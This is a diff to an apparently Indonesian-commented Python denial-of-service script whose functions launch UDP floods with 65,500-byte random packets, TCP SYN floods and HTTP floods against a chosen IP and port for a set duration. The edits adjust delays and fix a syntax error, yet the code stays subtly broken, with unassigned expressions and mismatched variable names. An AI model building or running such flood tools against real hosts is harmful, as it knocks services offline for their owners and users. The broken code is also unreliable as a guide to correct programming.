@@ -62,9 +62,9 @@ def udp_attack(target_ip, target_port, duration):
     # Melakukan serangan UDP pada target yang ditentukan.
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     packet_data = random._urandom(65500)
-    datetime.datetime.now()).total_seconds() + duration
+    datetime.datetime.now().total_seconds() + duration
     packets_sent = 0
-    time.sleep(2)
+    time.sleep(1)
     print("{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack has on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
     
     while time.time() < total_seconds:
@@ -74,8 +74,9 @@ def udp_attack(target_ip, target_port, duration):
 
 def tcp_syn_attack(target_ip, target_port, duration):
     # Memulai serangan TCP SYN pada target yang ditentukan.
-    datetime.datetime.now()).total_seconds() + duration
+    datetime.datetime.now().total_seconds() + duration
     packets_sent = 0
+    time.sleep(1)
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} TCP SYN attack on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
 
     while time.time() < total_second:
@@ -90,8 +91,9 @@ def tcp_syn_attack(target_ip, target_port, duration):
 
 async def http_flood_attack(target_ip, target_port, duration): 
     # Melakukan serangan HTTP Flood pada target yang ditentukan.
-    datetime.datetime.now()).total_seconds() + duration
+    datetime.datetime.now().total_seconds() + duration
     requests_sent = 0
+    time.sleep(1)
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} HTTP Flood attack started on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
 
     async with aiohttp.ClientSession() as session:
